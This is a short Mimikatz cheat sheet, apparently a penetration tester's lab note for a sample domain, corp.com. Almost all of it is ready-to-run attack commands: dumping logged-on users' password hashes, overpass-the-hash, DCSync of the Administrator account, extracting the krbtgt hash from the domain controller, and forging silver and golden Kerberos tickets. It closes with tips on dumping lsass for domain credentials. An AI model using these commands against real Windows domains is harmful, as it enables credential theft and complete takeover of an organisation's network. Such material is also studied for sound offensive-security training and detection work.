Mimikatz Commands:

Escalate Privileges
# privilege::debug

Logged On Users Hashes
# sekurlsa::logonpasswords

Overpass the Hash
# sekurlsa::pth /user:<USER> /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe

DC Sync to pull account info
# lsadump::dcsync /user:Administrator

List cached tickets
# kerberos::list

Flush cached tickets
# kerberos::purge

#Create Silver Ticket
# kerberos::purge
# kerberos::golden /user:<USER> /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

#Create Goldent Ticket from DC
# privilege::debug
# lsadump::lsa /patch
## Get krbtgt hash from memory
# kerberos::purge
# kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
##Launch a new command prompt with krbtgt privs
# misc::cmd

When accessing the Computers, use the HOSTNAME so Kerberos auth occurs vs IPAddress which forces NTLM auth 

If it is not on a domain, just dump the reg hives or run get-passhashes
Dumping lsass is far more reliable for getting domain creds than the reg hives